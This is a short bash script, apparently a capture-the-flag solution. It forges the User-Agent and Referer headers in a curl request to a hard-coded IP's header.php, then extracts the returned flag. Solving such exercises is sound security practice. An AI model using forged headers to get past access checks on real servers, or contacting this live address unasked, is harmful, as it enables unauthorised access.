#!/bin/bash

curl -s -H "User-Agent: Sup3rS3cr3tAg3nt" -e awesomesauce.com http://165.227.106.113/header.php | grep flag | cut -d ":" -f2

